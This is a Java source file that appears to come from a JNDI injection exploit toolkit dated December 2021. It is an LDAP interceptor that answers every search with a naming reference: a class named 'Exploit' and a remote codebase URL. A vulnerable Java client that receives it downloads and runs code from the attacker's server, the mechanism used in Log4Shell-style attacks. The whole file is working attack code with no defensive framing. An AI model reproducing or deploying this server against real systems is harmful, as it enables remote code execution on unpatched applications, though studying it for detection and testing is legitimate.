package xianzhan.jndi.ldap.interceptor;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.MalformedURLException;
import java.net.URL;

/**
 * @author xianzhan
 * @since 2021-12-19
 */
public class OperationInterceptor extends InMemoryOperationInterceptor {

    private final URL codebase;

    public OperationInterceptor(URL codebase) {
        this.codebase = codebase;
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, base, e);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
        URL tUrl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
        System.out.println("Send LDAP reference result for " + base + " redirecting to " + tUrl);

        e.addAttribute("javaClassName", "Exploit");
        String cbString = this.codebase.toString();
        int refPos = cbString.indexOf("#");
        if (refPos > 0) {
            cbString = cbString.substring(0, refPos);
        }
        e.addAttribute("javaCodeBase", cbString);
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaFactory", this.codebase.getRef());
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
